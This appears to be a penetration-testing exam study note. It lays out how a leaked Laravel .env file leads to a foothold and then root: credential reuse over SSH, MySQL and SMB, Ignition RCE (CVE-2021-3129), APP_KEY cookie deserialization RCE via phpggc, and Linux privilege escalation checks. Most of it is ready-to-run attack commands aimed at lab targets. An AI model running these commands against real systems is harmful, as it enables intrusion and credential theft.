# 🔐 Scenario 15 — Laravel `.env` leak → DB reuse + Laravel RCE

> **Given:** anonymous FTP (or an exposed path) leaks a Laravel **`.env`** — `APP_KEY`, `APP_DEBUG=true`, `DB_USERNAME`/`DB_PASSWORD`, `DB_DATABASE`, mail/redis config. Goal: foothold → root. A Laravel `.env` is **keys to the kingdom** — DB creds to reuse *and* the `APP_KEY`/debug that enable framework RCE. Sibling of [[Scenario 08 — Anonymous FTP leaks db_connect.php]]. Use placeholders; **never commit the real key/password.**

Part of [[_MOC (Standalone Scenarios)]]. Method: [[Standalone Boxes — Exam Solve Guide]]. Then: [[Credential Attacks]] · [[MySQL]] · [[SSH]] · [[RCE]] · [[Linux Privilege Escalation]].

```bash
export IP=<TARGET_IP> ; mkdir -p loot
```

---

## 🧠 WHAT A LARAVEL `.env` GIVES YOU
| Field | Weaponize |
|---|---|
| `DB_USERNAME` / `DB_PASSWORD` | **reuse** on SSH / MySQL / SMB (often the system password) |
| `APP_KEY` (`base64:...`) | **CVE-2018-15133** — decrypt/forge the session cookie → PHP object injection → RCE |
| `APP_DEBUG=true` | **CVE-2021-3129** — Laravel **Ignition** unauth RCE (if Ignition < 2.5.2) |
| `APP_URL` | the app's real host/vhost → add to `/etc/hosts` |
| `MAIL_*` / `REDIS_*` | more creds / services to pivot to |

> **Two independent wins:** the DB password is a reuse credential, **and** `APP_KEY` + `APP_DEBUG=true` are Laravel-specific RCE primitives. Try both.

---

## 1️⃣ GRAB + PARSE
```bash
ftp $IP            # anonymous : anonymous  -> get .env
grep -E 'APP_KEY|APP_DEBUG|APP_URL|DB_|REDIS_|MAIL_' .env   # note everything into loot/
```

## 2️⃣ ROUTE A — credential reuse (reuse-first)
```bash
ssh <DB_USERNAME>@$IP          # DB_PASSWORD reused as the system password (very common)
mysql -h $IP -u <DB_USERNAME> -p'<DB_PASSWORD>'   # if 3306 exposed -> dump app users -> crack
nxc smb $IP -u <DB_USERNAME> -p '<DB_PASSWORD>'
```
→ [[Credential Attacks]] · [[MySQL]]. A hit here is the whole foothold.

## 3️⃣ ROUTE B — Laravel RCE (the `.env` enables it)
**Ignition debug RCE — `APP_DEBUG=true` (CVE-2021-3129), easiest when it applies:**
```bash
git clone https://github.com/ambionics/laravel-exploits ; # + phpggc
php laravel-exploits/laravel-ignition-rce.php http://$IP/ Monolog/RCE1 'id'
#   abuses /_ignition/execute-solution when debug mode is on
```
**APP_KEY deserialization RCE (CVE-2018-15133):**
```bash
# with the leaked APP_KEY + phpggc Laravel gadget, forge the X-XSRF-TOKEN cookie:
phpggc Laravel/RCE9 system 'id' -b   # pick the chain matching the Laravel version
#   encrypt with the APP_KEY and send as the session cookie -> RCE
```
Confirm the exact Laravel version (`/_ignition`, `composer.lock` via LFI, headers) and pick the matching chain. ([[RCE]])

## 4️⃣ FOOTHOLD → PRIVESC
Land as `www-data` (RCE) or the reused user (SSH):
```bash
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; ./linpeas.sh | tee loot/linpeas.txt
# read the app's real .env on disk for MORE creds; re-test the DB pass for sudo/su
```
→ [[Linux Privilege Escalation]].

## 🗺️ DECISION FLOW
```
anon FTP .env (Laravel)
   ├─ DB_PASSWORD ──► reuse on SSH/MySQL/SMB ──► shell ───────────────┐
   ├─ APP_DEBUG=true ──► Ignition RCE (CVE-2021-3129) ──► www-data ───┤
   └─ APP_KEY ──► cookie deserialization RCE (CVE-2018-15133) ────────┤
                                                                      ▼
                                          foothold ──► sudo -l/SUID ──► ROOT ✅
```

## 🚧 STUCK?
1. DB pass reuses nowhere → use the **Laravel RCE** paths; also spray the username variants.
2. Ignition exploit 404s → debug may be off or Ignition patched; fall back to the **APP_KEY** chain.
3. Wrong gadget → match **phpggc chain** to the exact Laravel/framework version.
→ [[Scenario 08 — Anonymous FTP leaks db_connect.php]] · [[Standalone Boxes — Exam Solve Guide]].

## 🧠 ONE-LINE LESSON
**A Laravel `.env` is a double win: reuse `DB_PASSWORD` on SSH/MySQL (it's usually the system password), and turn `APP_DEBUG=true`/`APP_KEY` into framework RCE (Ignition CVE-2021-3129 or APP_KEY deserialization CVE-2018-15133).**
